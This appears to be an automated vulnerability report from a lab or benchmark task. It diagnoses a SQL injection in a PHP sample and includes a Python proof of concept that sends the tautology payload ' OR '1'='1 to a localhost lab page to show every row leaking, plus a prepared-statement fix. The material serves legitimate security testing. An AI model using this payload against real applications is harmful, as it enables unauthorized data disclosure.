@@ -1,0 +1,104 @@
+```json
+{
+  "sample_id": "S001",
+  "prediction": "vulnerable",
+  "vulnerability_type": "SQL注入",
+  "locations": ["F01:0007", "F01:0010", "F01:0011"],
+  "evidence": {
+    "source": "F01:0007 从 $_GET['name'] 读取外部输入，无需登录。",
+    "flow": "F01:0007 的 name 经 F01:0010 字符串拼接进入 WHERE 条件，再于 F01:0011 执行。",
+    "guard": "无效：F01:0010 没有绑定参数、转义或白名单；F01:0022-F01:0023 的 htmlspecialchars 仅保护输出，不改变 SQL 结构。",
+    "sink": "F01:0011 $db->query($sql) 执行由外部输入参与构造的 SQL。"
+  },
+  "prerequisites": [
+    "PHP + MariaDB 本地服务运行于 127.0.0.1:4280",
+    "common/db_connect.php 已提供可用 mysqli 变量 $db",
+    "lab_people 表存在并预置 (1,Alice)、(2,Bob)、(3,Carol)",
+    "入口 /lab_cases/S001/index.php 无需登录可访问"
+  ],
+  "missing_context": [
+    "common/db_connect.php 的具体实现未在输入包中；上下文仅声明 $db 已连接，未提供数据库权限与错误显示配置"
+  ],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "运行：python3 poc_s001.py。脚本固定访问 http://127.0.0.1:4280/lab_cases/S001/index.php，不读取任意主机，不跟随重定向，不外发数据。普通对照：name=Alice，预期解析到实际业务记录集合 {(1,'Alice')}，且不含 Bob/Carol；浏览器应只看到 Alice 一条记录，数据库无写入。测试步骤：name 参数发送 ' OR '1'='1，预期解析到至少 {(1,'Alice'),(2,'Bob'),(3,'Carol')} 三条记录；浏览器应看到三条记录，数据库仍无写入。成功断言比较解析后的 (id,name) 集合差异，不以 HTTP 200 为成功条件。若普通对照不符，检查端口、入口路径、lab_people 预置数据、$db 连接和 PHP 报错日志；若测试仍只返回 Alice，检查输入是否已被绑定/转义、载荷是否被改写或实际查询路径是否不同。"
+}
+```
+
+```python
+#!/usr/bin/env python3
+import http.client
+import urllib.parse
+import re
+import html
+import sys
+
+HOST = "127.0.0.1"
+PORT = 4280
+PATH = "/lab_cases/S001/index.php"
+
+def fetch_body(name):
+    conn = http.client.HTTPConnection(HOST, PORT, timeout=5)
+    query = urllib.parse.urlencode({"name": name})
+    conn.request("GET", f"{PATH}?{query}", headers={"Host": f"{HOST}:{PORT}"})
+    resp = conn.getresponse()
+    status = resp.status
+    body = resp.read().decode("utf-8", "replace")
+    conn.close()
+
+    # http.client 不自动跟随重定向；这里显式拒绝 3xx。
+    if 300 <= status < 400:
+        raise RuntimeError(f"拒绝重定向: HTTP {status}")
+    if status != 200:
+        raise RuntimeError(f"请求失败: HTTP {status}")
+    return body
+
+def parse_records(body):
+    records = set()
+    # 对应 F01:0022-F01:0023 的输出：<p>ID 1：Alice</p>
+    for m in re.finditer(r"<p>ID\s*(\d+)：([^<]*)</p>", body):
+        records.add((int(m.group(1)), html.unescape(m.group(2))))
+    return records
+
+def main():
+    normal_input = "Alice"
+    test_input = "' OR '1'='1"
+
+    expected_normal = {(1, "Alice")}
+    expected_test_min = {(1, "Alice"), (2, "Bob"), (3, "Carol")}
+
+    try:
+        normal_body = fetch_body(normal_input)
+        test_body = fetch_body(test_input)
+    except Exception as e:
+        print(f"请求阶段失败：{e}")
+        print("请检查：127.0.0.1:4280 是否监听、入口路径是否存在、PHP 报错日志、common/db_connect.php 的 $db 连接。")
+        return 2
+
+    normal_records = parse_records(normal_body)
+    test_records = parse_records(test_body)
+
+    print(f"普通请求 name={normal_input!r} 解析记录: {sorted(normal_records)}")
+    print(f"测试请求 name={test_input!r} 解析记录: {sorted(test_records)}")
+    print(f"预期普通记录: {sorted(expected_normal)}")
+    print(f"预期测试至少包含: {sorted(expected_test_min)}")
+
+    ok = (
+        normal_records == expected_normal
+        and expected_test_min.issubset(test_records)
+    )
+
+    if ok:
+        print("成功断言：普通请求仅返回 Alice；测试请求返回了 Alice/Bob/Carol 的实际业务记录，记录集合发生受控差异。")
+        return 0
+
+    print("未能完成判断：未满足记录集合断言。")
+    print("若普通请求不符，检查端口、路径、lab_people 预置数据和数据库连接；")
+    print("若测试请求仍只返回 Alice 或查询失败，检查输入是否被转义/预处理、测试载荷是否被改写、表数据与权限/错误配置。")
+    return 1
+
+if __name__ == "__main__":
+    sys.exit(main())
+```
+
+防护建议（未验证）：F01:0010 应使用 mysqli 预处理绑定 `name`，固定 SQL 为 `SELECT id, name FROM lab_people WHERE name = ?`，避免将外部输入拼接到 SQL 结构；输出转义可保留。
